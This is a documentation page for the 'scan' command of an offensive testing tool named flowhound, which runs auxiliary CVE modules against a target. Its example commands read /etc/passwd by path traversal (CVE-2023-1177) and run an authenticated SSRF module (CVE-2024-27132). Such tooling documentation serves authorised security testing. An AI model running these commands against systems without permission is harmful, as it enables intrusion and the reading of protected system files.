# Scan

The `scan` command launches auxiliary vulnerability modules against a target instance.

!!! warning "Authorised use only"
    Only run `scan` against systems you own or have explicit written permission to test.

---

## Purpose

Unlike `attack`, which executes remote code execution (RCE) exploits, `scan` executes **auxiliary** modules designed for diagnostics, file retrieval, or security testing (such as arbitrary file reads via path traversal or server-side request forgery).

---

## Syntax

```
flowhound scan --url <URL> --cve <CVE> [OPTIONS]
```

---

## Options

| Option | Required | Description |
|---|---|---|
| `--url` | Yes | URL of the target instance (e.g. `http://localhost:5000`) |
| `--cve` | Yes | Target auxiliary CVE identifier (e.g. `CVE-2023-1177`) |
| `--f_path` | No | Target file path on the remote system (e.g. `/etc/passwd`) for file-read modules |
| `--username` | No | Target username — must be paired with `--password` |
| `--password` | No | Target password — must be paired with `--username` |
| `--proxy` | No | HTTP(S) proxy to route all traffic through |
| `-h`, `--help` | No | Show help text and exit |

---

## Authentication

When targeting authenticated auxiliary modules (such as SSRF via `CVE-2024-27132`), supply `--username` and `--password`:

```bash
flowhound scan --url http://TARGET:5000 --cve CVE-2024-27132 --username admin --password secret
```

Unauthenticated modules (such as `CVE-2023-1177`) can be executed without credential arguments:

```bash
flowhound scan --url http://TARGET:5000 --cve CVE-2023-1177 --f_path /etc/passwd
```

---

## Examples

**Retrieve a remote file via path traversal (CVE-2023-1177):**

```bash
flowhound scan --url http://target.example.com:5000 --cve CVE-2023-1177 --f_path /etc/passwd
```

**Run an authenticated auxiliary scan through a proxy:**

```bash
flowhound scan --url http://target.example.com:5000 --cve CVE-2024-27132 --username admin --password secret --proxy http://127.0.0.1:8080
```

---

## See also

- [Attack](attack.md) — launching RCE exploits.
- [Sniff](sniff.md) — version detection and module enumeration.
- [Vulnerability Database](vulnerabilities.md) — list of all exploits and auxiliary modules.
